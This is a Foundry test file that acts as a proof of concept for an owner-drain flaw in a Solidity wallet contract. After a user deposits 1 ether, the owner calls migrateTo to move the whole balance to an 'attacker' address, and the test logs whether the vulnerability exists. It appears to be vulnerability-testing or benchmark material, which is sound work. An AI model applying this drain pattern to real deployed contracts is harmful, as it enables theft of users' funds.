// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/wallet_02_refund_nosub.sol";

contract WalletTest is Test {
    Wallet public wallet;
    address public owner = vm.addr(1);
    address public user = vm.addr(2);
    address public attacker = vm.addr(3);

    function setUp() public {
        // Owner deploys the wallet
        vm.prank(owner);
        wallet = new Wallet();
        
        // Fund user address with ETH for deposit
        vm.deal(user, 1 ether);
        
        // User deposits funds
        vm.prank(user);
        wallet.deposit{value: 1 ether}();
    }

    function testOwnerCanStealFunds() public {
        // Verify initial contract balance
        assertEq(address(wallet).balance, 1 ether);

        console2.log("--- BEFORE-Trigger ---");
        uint256 contractBalanceBefore = address(wallet).balance;
        uint256 attackerBalanceBefore = attacker.balance;
        console2.log("Contract ETH balance before: %s", contractBalanceBefore);
        console2.log("Attacker ETH balance before: %s", attackerBalanceBefore);

        console2.log("--- Trigger: wallet.migrateTo(attacker) ---");
        // Owner migrates all funds to attacker address
        vm.prank(owner);
        wallet.migrateTo(attacker);
        console2.log("Migration executed");

        console2.log("--- AFTER-Trigger ---");
        uint256 contractBalanceAfter = address(wallet).balance;
        uint256 attackerBalanceAfter = attacker.balance;
        console2.log("Contract ETH balance after: %s", contractBalanceAfter);
        console2.log("Attacker ETH balance after: %s", attackerBalanceAfter);

        // Validate fund transfer consistency
        bool fundsDrained = contractBalanceAfter == 0;
        bool fundsReceived = attackerBalanceAfter == attackerBalanceBefore + contractBalanceBefore;

        console2.log("Funds drained from contract:", fundsDrained ? "YES" : "NO");
        console2.log("Funds received by attacker:", fundsReceived ? "YES" : "NO");

        // Determine vulnerability status
        if (fundsDrained && fundsReceived) {
            console2.log("Vulnerability Exists: Owner was able to drain contract funds to attacker");
        } else {
            console2.log("Vulnerability not Exist: Funds were not transferred as expected");
        }
    }
}